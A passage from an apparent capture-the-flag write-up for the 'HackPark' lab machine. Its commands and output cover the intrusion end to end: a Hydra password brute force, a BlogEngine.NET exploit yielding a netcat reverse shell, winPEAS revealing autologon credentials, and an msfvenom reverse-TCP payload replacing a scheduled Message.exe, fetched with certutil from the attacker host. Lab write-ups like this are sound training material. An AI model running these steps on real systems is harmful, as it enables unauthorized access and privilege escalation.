[ATTEMPT] target 10.10.254.78 - login "admin" - pass "12345a" - 1432 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.254.78 - login "admin" - pass "marlboro" - 1433 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.254.78 - login "admin" - pass "merlin" - 1434 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.254.78 - login "admin" - pass "southside" - 1435 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.254.78 - login "admin" - pass "loser1" - 1436 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.254.78 - login "admin" - pass "brandi" - 1437 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.254.78 - login "admin" - pass "arlene" - 1438 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.254.78 - login "admin" - pass "blueeyes" - 1439 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.254.78 - login "admin" - pass "michel" - 1440 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.254.78 - login "admin" - pass "rachelle" - 1441 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.254.78 - login "admin" - pass "mackenzie" - 1442 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.254.78 - login "admin" - pass "ernesto" - 1443 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.254.78 - login "admin" - pass "champion" - 1444 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.254.78 - login "admin" - pass "missy" - 1445 of 14344399 [child 0] (0/0)
[80][http-post-form] host: 10.10.254.78   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-29 12:34:13
```

#### Inital access

After login to blog engine portal, version of blog engine found to be 3.3.6.0

![Blog engine version](/home/edith/pwn/vuln_machines/hackpark/001.png)

Using searchploit for any vulnerability

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/hackpark]
└─$ searchsploit "blog engine 3.3.6"
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                                         | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution                                         | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                                                    | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution                                    | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                                                 | aspx/webapps/47014.py
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

On checking the using `searchsploit -x aspx/webapps/46353.cs`

Copy the exploit and change the paramaeters (IP and port) and save it as PostView.ascx then upload & access it as per instructions in exploit 

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/hackpark]
└─$ nc -nvlp 4444
listening on [any] 4444 ...

connect to [10.17.49.246] from (UNKNOWN) [10.10.151.93] 57897
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
c:\windows\system32\inetsrv>

c:\windows\system32\inetsrv>
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

#### Privilege escalation

Transfer winpeas script to the machine and run it

- On winpeas userinfo, we get windows autologin credentails

```
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups
  Current user: Blog
  Current groups: Everyone, Users, Service, Console Logon, Authenticated Users, This Organization, IIS_IUSRS, Local, S-1-5-82-0
   =================================================================================================
    HACKPARK\Administrator: Built-in account for administering the computer/domain
        |->Password: CanChange-Expi-Req
    HACKPARK\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Password: NotChange-NotExpi-NotReq
    HACKPARK\jeff
        |->Password: NotChange-NotExpi-Req
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
   Current User   :     IIS APPPOOL\Blog
   Idle Time      :     00h:17m:50s:843ms
ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
È Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation                                                                                                                                                        
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeAuditPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text
ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
    HACKPARK\Administrator
ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   HACKPARK
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   5/3/2024 5:00:04 AM
   Logons Count            :   25
   Password Last Set       :   8/3/2019 10:43:23 AM
   =================================================================================================
   Computer Name           :   HACKPARK
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM
   =================================================================================================
   Computer Name           :   HACKPARK
   User Name               :   jeff
   User Id                 :   1001
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   8/4/2019 11:54:52 AM
   Logons Count            :   1
   Password Last Set       :   8/4/2019 11:54:00 AM
   =================================================================================================
ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
    IIS APPPOOL\.NET v4.5 Classic
    IIS APPPOOL\.NET v4.5
    HACKPARK\Administrator
    HACKPARK\jeff
ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\.NET v4.5
    C:\Users\.NET v4.5 Classic
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\jeff
    C:\Users\Public : Service [WriteData/CreateFiles]
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  administrator
    DefaultPassword               :  4q6XvFES7Fdxs
```

> We already got the Administrator credentials in windows autologon on winpeas execution, we can login to the machine using RDP using admin creds - But lets do some other privilege escalation way...

- On winpeas servicesinfo, we get service named WindowsScheduler running and it path is writtable

```
    ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
    ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
    È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                                                                                      
        Amazon EC2Launch(Amazon Web Services, Inc. - Amazon EC2Launch)["C:\Program Files\Amazon\EC2Launch\EC2Launch.exe" service] - Auto - Stopped
        Amazon EC2Launch
       =================================================================================================                                                         
        AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
        Amazon SSM Agent
       =================================================================================================                                                         
        AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
        AWS Lite Guest Agent
       =================================================================================================                                                         
        Ec2Config(Amazon Web Services, Inc. - Ec2Config)["C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe"] - Auto - Running - isDotNet
        Ec2 Configuration Service
       =================================================================================================                                                         
        PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped
       =================================================================================================
        WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
        File Permissions: Everyone [WriteData/CreateFiles]
        Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
        System Scheduler Service Wrapper
        =================================================================================================
```

Traverse to C:\Program Files (x86)\SystemScheduler\Events directory and checking the log file, we found that this server (SystemScheduler) running with admin privilege and it starts the process named "Message.exe"

```
type Administrator.flg
C:\Program Files (x86)\SystemScheduler\Events>type Administrator.flg
[LatestSessionInfo]
SessionID=1
[Administrator1]
Time=03/05/24 06:01:36
RemoteSession=0
DesktopName=Default
StationName=WinSta0
SessionID=1
ProcessID=2864
UserID=Administrator

C:\Program Files (x86)\SystemScheduler\Events>
type 20198415519.INI_LOG.txt
C:\Program Files (x86)\SystemScheduler\Events>type 20198415519.INI_LOG.txt
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
08/04/19 15:07:00,Event Started Ok, (Administrator)
08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)
08/04/19 15:08:00,Event Started Ok, (Administrator)
08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
08/04/19 15:09:00,Event Started Ok, (Administrator)
08/04/19 15:09:34,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)
08/04/19 15:10:00,Event Started Ok, (Administrator)
08/04/19 15:10:33,Process Ended. PID:1556,ExitCode:4,Message.exe (Administrator)
08/04/19 15:11:00,Event Started Ok, (Administrator)
```

On checking the running process, we found that Message.exe is starting and stopping automatically again n again 

```
C:\Program Files (x86)\SystemScheduler\Events>
tasklist
C:\Program Files (x86)\SystemScheduler\Events>tasklist
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0                            0          4 K
System                           4                            0        276 K
smss.exe                       368                            0      1,048 K
csrss.exe                      524                            0      3,548 K
csrss.exe                      576                            1      8,992 K
wininit.exe                    584                            0      3,476 K
winlogon.exe                   612                            1      5,776 K
services.exe                   672                            0      5,468 K
lsass.exe                      680                            0      9,040 K
svchost.exe                    744                            0      9,616 K
svchost.exe                    788                            0      6,084 K
dwm.exe                        868                            1     27,212 K
svchost.exe                    876                            0     15,360 K
svchost.exe                    908                            0     29,532 K
svchost.exe                    960                            0      9,588 K
svchost.exe                     68                            0     15,008 K
svchost.exe                    528                            0     10,384 K
spoolsv.exe                   1136                            0      8,784 K
amazon-ssm-agent.exe          1176                            0     12,528 K
svchost.exe                   1248                            0      7,216 K
LiteAgent.exe                 1268                            0      3,392 K
svchost.exe                   1340                            0      9,964 K
svchost.exe                   1356                            0      8,188 K
WService.exe                  1404                            0      3,580 K
WScheduler.exe                1552                            0      4,188 K
Ec2Config.exe                 1648                            0     47,684 K
WmiPrvSE.exe                  1740                            0     23,672 K
svchost.exe                   2168                            0      7,520 K
taskhostex.exe                2620                            1      5,744 K
explorer.exe                  2688                            1     59,148 K
ServerManager.exe             1948                            1     52,816 K
WScheduler.exe                2864                            1      5,252 K
msdtc.exe                     3000                            0      6,172 K
w3wp.exe                       968                            0    219,592 K
cmd.exe                       1972                            0      2,668 K
conhost.exe                   1488                            0      2,624 K
cmd.exe                       2036                            0      2,460 K
conhost.exe                   2868                            0      2,624 K
cmd.exe                       1732                            0      2,344 K
conhost.exe                   1752                            0      2,624 K
WMIC.exe                       740                            0      6,848 K
cmd.exe                       2068                            0      2,548 K
conhost.exe                   1380                            0      2,624 K
Message.exe                   1780                            1      7,240 K
tasklist.exe                  1620                            0      5,184 K
```

> So we try to make a revershe shell in the name of Message.exe and replace it with actual one.

##### Creating payload and hosting it locally

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/hackpark]
└─$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.17.49.246 LPORT=8888 -f exe -o Message.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: Message.exe
```

##### Setting up listener

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.17.49.246
LHOST => 10.17.49.246
msf6 exploit(multi/handler) > set LPORT 8888
LPORT => 8888
```

##### Transferring payload to remote system

```
C:\Program Files (x86)\SystemScheduler>certutil -urlcache -f http://10.17.49.246:8000/Message.exe Message.exe

****  Online  ****
CertUtil: -URLCache command completed successfully.
C:\Program Files (x86)\SystemScheduler>
```

##### Exploit

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.17.49.246:8888 

[*] Sending stage (336 bytes) to 10.10.151.93
[*] Command shell session 1 opened (10.17.49.246:8888 -> 10.10.151.93:58114) at 2024-05-03 19:50:06 +0530

Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----

C:\PROGRA~2\SYSTEM~1>
C:\PROGRA~2\SYSTEM~1>

C:\PROGRA~2\SYSTEM~1>whoami 
whoami

C:\PROGRA~2\SYSTEM~1>systeminfo
systeminfo

Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA886
Original Install Date:     8/3/2019, 10:43:23 AM
System Boot Time:          5/3/2024, 4:58:57 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,096 MB
Available Physical Memory: 2,596 MB
Virtual Memory: Max Size:  6,074 MB
Virtual Memory: Available: 3,638 MB
Virtual Memory: In Use:    2,436 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\HACKPARK
Hotfix(s):                 8 Hotfix(s) Installed.
                           [01]: KB2919355
                           [02]: KB2919442
                           [03]: KB2937220
                           [04]: KB2938772
                           [05]: KB2939471
                           [06]: KB2949621
                           [07]: KB3035131
                           [08]: KB3060716
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.151.93
                                 [02]: fe80::1403:30cc:b612:ab84
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of C:\Users\Administrator\Desktop

08/04/2019  11:49 AM    <DIR>          .
08/04/2019  11:49 AM    <DIR>          ..
08/04/2019  11:51 AM                32 root.txt
08/04/2019  04:36 AM             1,029 System Scheduler.lnk
               2 File(s)          1,061 bytes
               2 Dir(s)  38,527,033,344 bytes free
```
